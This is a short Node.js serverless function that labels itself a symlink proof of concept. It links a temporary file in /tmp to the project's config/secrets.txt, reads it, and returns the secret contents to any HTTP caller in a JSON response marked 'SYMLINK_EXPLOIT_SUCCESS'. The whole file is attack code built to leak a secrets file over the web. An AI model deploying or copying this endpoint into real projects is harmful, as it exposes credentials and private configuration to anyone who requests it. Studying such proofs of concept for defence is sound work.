const fs = require('fs');
const path = require('path');

module.exports = async (req, res) => {
    try {
        const targetPath = path.join(process.cwd(), 'config', 'secrets.txt');
        
        const bridgeName = `symlink_poc_${Math.random().toString(36).substring(7)}`;
        const linkPath = path.join('/tmp', bridgeName);

        if (!fs.existsSync(linkPath)) {
            fs.symlinkSync(targetPath, linkPath);
        }

        const leakedData = fs.readFileSync(linkPath, 'utf8');

        fs.unlinkSync(linkPath);

        res.status(200).json({
            message: "SYMLINK_EXPLOIT_SUCCESS",
            method: "Filesystem Binding via /tmp",
            secret_content: leakedData,
            accessed_via: linkPath
        });
    } catch (err) {
        res.status(500).json({ 
            error: "Symlink Failed", 
            detail: err.message 
        });
    }
};
